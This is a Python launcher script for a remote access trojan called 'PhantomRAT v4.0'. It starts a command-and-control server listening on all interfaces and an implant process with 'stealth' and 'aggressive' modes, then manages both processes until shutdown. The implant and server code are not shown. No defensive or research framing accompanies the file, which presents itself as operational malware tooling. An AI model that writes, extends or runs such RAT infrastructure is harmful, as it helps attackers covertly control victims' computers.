#!/usr/bin/env python3
"""
PhantomRAT Launcher - Optimized startup
"""

import os
import sys
import argparse
import subprocess
import time
from pathlib import Path

def optimize_python():
    """Optimize Python runtime settings"""
    # Set environment variables for performance
    os.environ['PYTHONOPTIMIZE'] = '1'
    os.environ['PYTHONUNBUFFERED'] = '1'
    os.environ['PYTHONDONTWRITEBYTECODE'] = '1'
    
    # Increase file descriptor limit (Unix)
    if hasattr(os, 'setpgrp'):
        try:
            import resource
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
        except:
            pass

def start_c2_server(host='0.0.0.0', port=8000, debug=False):
    """Start C2 server with optimizations"""
    print(f"[*] Starting C2 server on {host}:{port}")
    
    cmd = [
        sys.executable, 'c2_server.py',
        '--host', host,
        '--port', str(port)
    ]
    
    if debug:
        cmd.append('--debug')
    
    return subprocess.Popen(cmd)

def start_implant(mode='standard'):
    """Start implant with optimizations"""
    print(f"[*] Starting implant in {mode} mode")
    
    cmd = [sys.executable, 'main.py']
    
    if mode == 'test':
        cmd.append('--test')
    elif mode == 'stealth':
        cmd.append('--stealth')
    elif mode == 'aggressive':
        cmd.append('--aggressive')
    
    return subprocess.Popen(cmd)

def main():
    parser = argparse.ArgumentParser(description='PhantomRAT Launcher')
    parser.add_argument('--mode', choices=['c2', 'implant', 'both'], default='both',
                       help='Operation mode')
    parser.add_argument('--host', default='0.0.0.0', help='C2 server host')
    parser.add_argument('--port', type=int, default=8000, help='C2 server port')
    parser.add_argument('--implant-mode', default='standard',
                       choices=['standard', 'stealth', 'aggressive', 'test'],
                       help='Implant operation mode')
    parser.add_argument('--optimize', action='store_true', help='Enable optimizations')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    
    args = parser.parse_args()
    
    print("""
    ╔══════════════════════════════════════════════════╗
    ║          PHANTOM RAT v4.0 LAUNCHER              ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    # Apply optimizations
    if args.optimize:
        optimize_python()
        print("[+] Python runtime optimized")
    
    processes = []
    
    try:
        # Start C2 server if needed
        if args.mode in ['c2', 'both']:
            c2_process = start_c2_server(args.host, args.port, args.debug)
            processes.append(('C2 Server', c2_process))
        
        # Start implant if needed
        if args.mode in ['implant', 'both']:
            # Small delay to ensure C2 is up
            time.sleep(2)
            
            implant_process = start_implant(args.implant_mode)
            processes.append(('Implant', implant_process))
        
        print(f"\n[+] Started {len(processes)} process(es)")
        print("[*] Press Ctrl+C to stop all processes")
        
        # Keep running until interrupted
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        
        # Terminate all processes
        for name, process in processes:
            print(f"[*] Stopping {name}...")
            process.terminate()
            try:
                process.wait(timeout=5)
                print(f"[+] {name} stopped")
            except subprocess.TimeoutExpired:
                print(f"[!] {name} did not terminate, killing...")
                process.kill()
        
        print("[+] All processes terminated")
    
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
